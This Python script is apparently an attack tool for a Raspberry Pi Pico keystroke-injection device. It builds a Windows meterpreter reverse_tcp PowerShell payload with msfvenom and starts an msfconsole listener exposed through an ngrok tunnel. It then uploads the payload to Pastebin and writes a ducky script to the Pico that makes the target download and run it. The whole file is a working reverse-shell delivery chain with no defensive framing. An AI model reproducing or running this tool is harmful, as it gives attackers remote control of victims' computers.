import os
import subprocess
import requests


PASTEBIN_DEV_API_KEY = ""
USERNAME = os.getlogin()

# Just an example , will be ask to enter these later
venom_lhost = '0.tcp.jp.ngrok.io'
venom_lport = 33333
#

PAYLOAD_LHOST = '0.0.0.0'
# Default ngrok port
ngrok_port = 4444


CURRENT_DIRECTORY = os.path.dirname(os.path.realpath(__file__))
PAYLOAD_TEMPLATE_PATH = CURRENT_DIRECTORY+"/payload_template"
REV_PS1_PATH = CURRENT_DIRECTORY+"/rev.ps1"


def SetUpNgrok():
    global ngrok_port
    try:
        ngrok_port = input("Enter ngrok port : ")
    except:
        print()
    subprocess.Popen(
        f'x-terminal-emulator -e ngrok tcp {ngrok_port}', shell=True)


def Paste_To_PASTEBIN() -> str:

    REV_PS1 = open(REV_PS1_PATH, 'r').read()

    data = {
        'api_dev_key': PASTEBIN_DEV_API_KEY,
        'api_option': 'paste',
        'api_paste_code': REV_PS1,
        'api_paste_expire_date': 'N',
    }

    r = requests.post("https://pastebin.com/api/api_post.php", data=data)
    print(r.status_code, r.text)
    return r.text


def Write_To_Payload_dd(path, url):
    payload_dd = open(path, 'w')
    payload_dd.write(payload_template.read().replace("{REV_PS1_URL}", url))
    payload_dd.close


if __name__ == '__main__':
    print("Running under : "+CURRENT_DIRECTORY)
    # if input("Init ngrok  (y/n) : ").lower() == 'y':
    # os.system('killall ngrok')

    CIRCUITPY_PATH = f"/media/{USERNAME}/CIRCUITPY"
    while not os.path.exists(CIRCUITPY_PATH):
        input("PICO is not mounted , make sure mount PICO and press ENTER to continue : ")

    SetUpNgrok()

    venom_lhost, venom_lport = input(
        "Enter ngrok url in format like ngrok.io:port : ").split(":")
    print(venom_lhost, venom_lport)

    MSFVENOM_CMD = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={venom_lhost} LPORT={venom_lport} -f psh -o rev.ps1'
    MSFCONSOLE_CMD = f"msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost {PAYLOAD_LHOST};set lport {ngrok_port};exploit'"
    
    os.system(MSFVENOM_CMD)
    print(MSFVENOM_CMD)

    subprocess.Popen(f"x-terminal-emulator -e {MSFCONSOLE_CMD}", shell=True)
    print(MSFCONSOLE_CMD)

    pastebin_URL = "https://pastebin.com/raw/" + \
        Paste_To_PASTEBIN().split("/")[-1]
    print(pastebin_URL)

    payload_template = open(PAYLOAD_TEMPLATE_PATH, 'r')
    # print(payload_template.read().replace("{REV_PS1_URL}", pastebin_URL))

    Write_To_Payload_dd(path=CIRCUITPY_PATH+"/payload.dd", url=pastebin_URL)
